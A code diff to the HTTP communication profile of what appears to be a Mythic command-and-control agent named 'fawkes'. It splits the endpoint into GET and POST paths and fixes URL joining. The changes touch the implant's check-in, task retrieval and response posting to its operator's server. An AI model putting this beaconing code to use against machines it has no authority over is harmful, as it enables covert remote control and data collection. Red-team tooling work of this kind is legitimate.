@@ -14,6 +14,7 @@ import (
 	"io"
 	"log"
 	"net/http"
+	"strings"
 	"time"
 
 	"fawkes/pkg/structs"
@@ -28,13 +29,14 @@ type HTTPProfile struct {
 	SleepInterval int
 	Jitter        int
 	Debug         bool
-	Endpoint      string
+	GetEndpoint   string
+	PostEndpoint  string
 	client        *http.Client
 	CallbackUUID  string // Store callback UUID from initial checkin
 }
 
 // NewHTTPProfile creates a new HTTP profile
-func NewHTTPProfile(baseURL, userAgent, encryptionKey string, maxRetries, sleepInterval, jitter int, debug bool, endpoint string) *HTTPProfile {
+func NewHTTPProfile(baseURL, userAgent, encryptionKey string, maxRetries, sleepInterval, jitter int, debug bool, getEndpoint, postEndpoint string) *HTTPProfile {
 	profile := &HTTPProfile{
 		BaseURL:       baseURL,
 		UserAgent:     userAgent,
@@ -43,7 +45,8 @@ func NewHTTPProfile(baseURL, userAgent, encryptionKey string, maxRetries, sleepI
 		SleepInterval: sleepInterval,
 		Jitter:        jitter,
 		Debug:         debug,
-		Endpoint:      endpoint,
+		GetEndpoint:   getEndpoint,
+		PostEndpoint:  postEndpoint,
 	}
 
 	// Create HTTP client with reasonable defaults
@@ -100,7 +103,7 @@ func (h *HTTPProfile) Checkin(agent *structs.Agent) error {
 	encodedData := base64.StdEncoding.EncodeToString(messageData)
 
 	// Send checkin request to configured endpoint
-	resp, err := h.makeRequest("POST", h.Endpoint, []byte(encodedData))
+	resp, err := h.makeRequest("POST", h.PostEndpoint, []byte(encodedData))
 	if err != nil {
 		return fmt.Errorf("checkin request failed: %w", err)
 	}
@@ -170,7 +173,7 @@ func (h *HTTPProfile) Checkin(agent *structs.Agent) error {
 // GetTasking retrieves tasks from Mythic
 func (h *HTTPProfile) GetTasking(agent *structs.Agent) ([]structs.Task, error) {
 	if h.Debug {
-		// log.Printf("[DEBUG] GetTasking URL: %s%s", h.BaseURL, h.Endpoint)
+		// log.Printf("[DEBUG] GetTasking URL: %s%s", h.BaseURL, h.GetEndpoint)
 	}
 	taskingMsg := structs.TaskingMessage{
 		Action:      "get_tasking",
@@ -199,7 +202,7 @@ func (h *HTTPProfile) GetTasking(agent *structs.Agent) ([]structs.Task, error) {
 	messageData := append([]byte(activeUUID), body...)
 	encodedData := base64.StdEncoding.EncodeToString(messageData)
 
-	resp, err := h.makeRequest("POST", h.Endpoint, []byte(encodedData))
+	resp, err := h.makeRequest("POST", h.PostEndpoint, []byte(encodedData))
 	if err != nil {
 		// log.Printf("[DEBUG] GetTasking makeRequest failed: %v", err)
 		return nil, fmt.Errorf("get tasking request failed: %w", err)
@@ -407,7 +410,7 @@ func (h *HTTPProfile) PostResponse(response structs.Response, agent *structs.Age
 	messageData := append([]byte(agent.PayloadUUID), body...)
 	encodedData := base64.StdEncoding.EncodeToString(messageData)
 
-	resp, err := h.makeRequest("POST", h.Endpoint, []byte(encodedData))
+	resp, err := h.makeRequest("POST", h.PostEndpoint, []byte(encodedData))
 	if err != nil {
 		return fmt.Errorf("post response request failed: %w", err)
 	}
@@ -427,7 +430,19 @@ func (h *HTTPProfile) PostResponse(response structs.Response, agent *structs.Age
 
 // makeRequest is a helper function to make HTTP requests
 func (h *HTTPProfile) makeRequest(method, path string, body []byte) (*http.Response, error) {
-	url := h.BaseURL + path
+	// Ensure proper URL construction with forward slash
+	var url string
+	if strings.HasSuffix(h.BaseURL, "/") && strings.HasPrefix(path, "/") {
+		// Both have slash, remove one
+		url = h.BaseURL + path[1:]
+	} else if !strings.HasSuffix(h.BaseURL, "/") && !strings.HasPrefix(path, "/") {
+		// Neither has slash, add one
+		url = h.BaseURL + "/" + path
+	} else {
+		// One has slash, just concatenate
+		url = h.BaseURL + path
+	}
+	
 	if h.Debug {
 		// log.Printf("[DEBUG] Making %s request to %s (body length: %d)", method, url, len(body))
 	}
